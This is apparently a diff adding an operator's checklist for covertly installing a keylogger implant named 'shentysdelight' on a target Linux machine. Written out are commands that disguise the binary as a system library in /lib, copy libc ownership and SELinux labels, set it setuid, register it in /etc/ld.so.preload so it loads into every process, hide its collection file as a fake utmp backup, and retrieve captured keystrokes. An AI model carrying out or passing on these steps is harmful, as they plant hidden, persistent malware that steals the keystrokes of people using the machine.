@@ -1,0 +1,94 @@
+#localy
+sha1sum PROJECTNAME.IP
+
+mx
+:%s/UNHOOK/UNHOOK/g
+'x
+
+
+#on target
+uname -a
+
+#kernel > 2.6.10
+mx
+:%s:FILENAME:linux-gate.so.0:g
+'x
+# --- or ----
+mx
+:%s:FILENAME:libattr.so:g
+'x
+
+#kernel < 2.6.10
+mx
+:%s:FILENAME:libnsl-2.2.4.so:g
+'x
+
+
+-lt /usr/lib/FILENAME
+# verify it does not exist
+
+ls -l /selinux
+#does SeLinux exist on this box? if not put a # in the search below
+mx
+:%s/SELINUX//g
+'x
+
+-lt /var/run
+#check to make sure /var/run/utmp exists adjusts collection file as needed
+#if your filename has a ~ in it make sure to escape it 
+mx
+:%s:COLFILE:utmp\~:g
+'x
+
+#locally
+cp shentysdelight.linux FILENAME
+./Store --file="FILENAME" --wipe
+#delete old settings
+
+
+echo -ne "/var/run/COLFILE\0" | ./Store --file="FILENAME" --set="cf"
+echo -ne "/dev/tty\0" | ./Store --file="FILENAME" --set="tf1"
+echo -ne "UNHOOK\0" | ./Store --file="FILENAME" --set="env"
+echo -ne "FILENAME\0" | ./Store --file="FILENAME" --set="hf1"
+echo -ne "COLFILE\0" | ./Store --file="FILENAME" --set="hf2"
+
+-lt /etc/ld.so.preload
+#Does the file exist? If not remove the  # from the following search
+mx
+:%s/NOLDSO/#/g
+'x
+
+
+NOLDSO echo -ne "ld.so.preload\0" | ./Store --file="FILENAME" --set="hf3"
+
+cp FILENAME /current/up
+
+#on target
+-put /current/up/FILENAME FILENAME
+
+mv FILENAME /lib
+chown --reference=/lib/$(readlink /lib/libc.so.6) /lib/FILENAME
+chmod 4755 /lib/FILENAME
+SELINUX chcon --reference=/lib/libc.so.6 /lib/FILENAME
+echo "1" > /var/run/COLFILE
+SELINUX chcon --reference=/var/run/utmp /var/run/COLFILE
+
+
+echo "FILENAME" >> /etc/ld.so.preload
+NOLDSO chmod 644 /etc/ld.so.preload
+SELINUX NOLDSO chcon --reference=/etc/passwd /etc/ld.so.preload
+
+#put the following in your opnotes
+installed SHETYSDELIGHT as /lib/FILENAME collectionfile is /var/run/COLFILE
+SeLinux is ->SELINUX<- noldso is ->NOLDSO<- unhook environment variable is
+->UNHOOK<-
+
+
+################Collection###########################
+
+-get /var/run/utmp~
+echo "1" > /var/run/utmp~
+
+./ExtractData FILENAME > /current/down/sniffer/keylogger
+
+
